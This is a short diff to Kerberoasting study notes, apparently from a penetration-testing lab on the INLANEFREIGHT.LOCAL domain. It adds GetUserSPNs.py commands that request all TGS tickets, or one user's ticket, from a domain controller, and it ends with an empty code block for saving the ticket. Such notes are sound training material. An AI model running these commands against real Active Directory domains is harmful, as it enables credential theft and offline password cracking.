@@ -43,3 +43,20 @@ Several tools can be utilized to perform the attack:
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 ```
 
+#### Requesting all TGS Tickets
+
+```shell
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
+```
+
+#### Requesting a Single TGS ticket
+
+```shell
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+#### Saving the TGS Ticket to an Output File
+
+```shell
+
+```
